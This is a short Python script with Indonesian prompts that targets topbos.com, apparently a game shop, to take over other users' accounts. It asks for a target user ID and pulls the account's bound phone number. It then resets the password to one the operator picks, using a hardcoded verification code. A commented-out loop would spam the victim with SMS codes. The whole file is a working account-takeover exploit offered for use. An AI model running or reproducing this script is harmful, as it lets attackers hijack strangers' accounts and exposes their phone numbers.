import requests,time,os,sys,json


def slowprint(kata):
	for k in kata+'\n':
		sys.stdout.write(k)
		sys.stdout.flush()
		time.sleep(.9/10)

if __name__ == '__main__':
	os.system('clear')
	userid = input("Masukkan ID Target: ")
	response = requests.get('https://topbos.com/shop/getUserInfo.do?userId='+userid)
	log = response.json()
	nama = requests.get('https://www.topbos.com/web/infullRequest.do?userId='+userid+'&costKey=com.neptune.domino.coincard0035&infullType=4&version=1.63')
	nick = nama.json()
	slowprint('Proses Login Ke Akun '+str(nick['message']['nickName']))
	if log['message'][5:7] == '08':
		nomor = log['message'][5:]
		slowprint('Login Berhasil')
		print(nomor)
		newpas = input('Masukkan Password Baru: ')
		response2 = requests.get('https://topbos.com/shop/changePwdIndex.do?userId='+userid+'&bindPhone='+nomor+'&code=3247&secondPwd='+newpas+'&sendCodeFlag=0')
		log2 = response2.json()
		if log2['code'] == '0':
			#for i in range(0,3):
				#response3 = requests.get('https://topbos.com/shop/sendPwdCodeIndex.do?userId='+userid+'&bindPhone='+nomor)
				#slowprint('Proses Spam Ke : '+str(i))
			slowprint('Password Berhasil Di Ganti')
		else:
			slowprint(log2['message'])
	else:
		slowprint(log['message'])
